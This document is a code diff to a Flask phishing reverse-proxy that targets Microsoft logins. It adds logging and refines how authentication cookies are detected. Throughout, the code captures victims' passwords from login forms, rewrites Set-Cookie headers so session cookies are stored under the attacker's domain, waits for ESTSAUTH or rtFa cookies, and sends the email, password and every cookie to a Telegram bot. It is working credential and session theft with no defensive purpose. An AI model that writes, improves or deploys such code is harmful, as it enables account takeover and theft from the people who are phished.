@@ -2,6 +2,7 @@ import os
 import uuid
 import requests
 from flask import Flask, request, Response
+import sys
 
 app = Flask(__name__)
 
@@ -17,37 +18,53 @@ visitor_sessions = {}
 # vid -> {"email":..., "password":..., "sent":...}
 CAPTURED = {}
 
+def log(msg):
+    print(f"[APP LOG] {msg}", flush=True)
 
 # --- Telegram ---
 def send_telegram(message):
     try:
-        requests.post(
+        log("Attempting to send Telegram message...")
+        resp = requests.post(
             f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
             json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"},
             timeout=10,
         )
+        if resp.status_code == 200:
+            log("Telegram message sent successfully.")
+        else:
+            log(f"Telegram API error: {resp.status_code} - {resp.text}")
     except Exception as e:
-        print(f"[TG ERROR] {e}")
+        log(f"[TG ERROR] {e}")
 
 
 # --- Cookie capture after login ---
 def check_and_send(vid):
     info = CAPTURED.get(vid)
-    if not info or info.get("sent"):
+    if not info:
         return
     
+    if info.get("sent"):
+        return
+
     sess = visitor_sessions.get(vid)
     if not sess:
+        log(f"No session found for vid {vid}")
         return
 
     cookies = sess.cookies.get_dict()
+    log(f"Checking cookies for vid {vid}: {list(cookies.keys())}")
     
-    # Check for any significant auth cookies
-    auth_cookies = [k for k in cookies if any(x in k.lower() for x in ["estsauth", "msauth", "aspcore", "login", "auth"])]
-    
-    if auth_cookies:
+    # Check for significant auth cookies
+    # Microsoft often uses ESTSAUTH, ESTSAUTHPERSISTENT, or rtFa
+    auth_found = False
+    for k in cookies:
+        if "ESTS" in k or "rtFa" in k or "MSAuth" in k:
+            auth_found = True
+            break
+            
+    if auth_found:
         info["sent"] = True
-        # Format all cookies for telegram
         cookie_str = "\n".join(f"<code>{k}={v}</code>" for k, v in cookies.items())
         
         msg = (
@@ -57,20 +74,12 @@ def check_and_send(vid):
             f"<b>Cookies:</b>\n{cookie_str}"
         )
         send_telegram(msg)
-        print(f"[SUCCESS] Sent data for vid: {vid}")
     else:
-        # Debugging: if we have password but no cookies, print what we DO have
-        if info.get('password'):
-            print(f"[DEBUG] Vid {vid} has password but no auth cookies yet. Cookies: {list(cookies.keys())}")
+        log(f"No auth cookies found yet for vid {vid}. Captured password: {bool(info.get('password'))}")
 
 
-# --- Multi-value Set-Cookie extraction (works on urllib3 v1 and v2) ---
+# --- Multi-value Set-Cookie extraction ---
 def get_set_cookies(resp):
-    """
-    requests' resp.headers merges repeated Set-Cookie headers with ', '
-    which breaks cookies that contain 'Expires=Wed, 15 Nov 2026 ...'.
-    Read the raw urllib3 header dict instead.
-    """
     raw = getattr(resp, "raw", None)
     raw_headers = getattr(raw, "headers", None)
     if raw_headers is not None:
@@ -98,11 +107,6 @@ def rewrite_links(text):
 
 
 def fix_set_cookie(header_value):
-    """
-    Strip Domain= and Path= so the victim's browser stores the cookie
-    under our own domain, then force Path=/ so it is echoed on every
-    proxied request.
-    """
     parts = [p.strip() for p in header_value.split(";") if p.strip()]
     kept = [
         p for p in parts
@@ -122,6 +126,7 @@ def get_session(vid, user_agent):
             "Accept-Language": "en-US,en;q=0.9",
         })
         visitor_sessions[vid] = s
+        log(f"Created new session for vid: {vid}")
     return visitor_sessions[vid]
 
 
@@ -139,6 +144,7 @@ def proxy(path):
     if not vid:
         vid = str(uuid.uuid4())
         new_vid = True
+        log(f"New visitor detected. Assigned vid: {vid}")
 
     sess = get_session(vid, request.headers.get("User-Agent"))
 
@@ -159,7 +165,8 @@ def proxy(path):
 
     try:
         if request.method == "POST":
-            # Allow redirects to capture final auth cookies
+            log(f"POST request to {target} for vid {vid}")
+            # Allow redirects to ensure we catch the final auth cookies
             resp = sess.post(
                 target, data=request.form, headers=headers,
                 allow_redirects=True, timeout=25,
@@ -167,6 +174,7 @@ def proxy(path):
         else:
             resp = sess.get(target, headers=headers, allow_redirects=True, timeout=25)
     except Exception as e:
+        log(f"Proxy error: {e}")
         return f"Proxy error: {e}", 502
 
     # --- Capture credentials from the login POST ---
@@ -178,6 +186,7 @@ def proxy(path):
             or request.form.get("username")
         )
         if passwd:
+            log(f"Password captured for vid {vid}: {login}")
             prev = CAPTURED.get(vid, {})
             CAPTURED[vid] = {
                 "email": login or prev.get("email"),
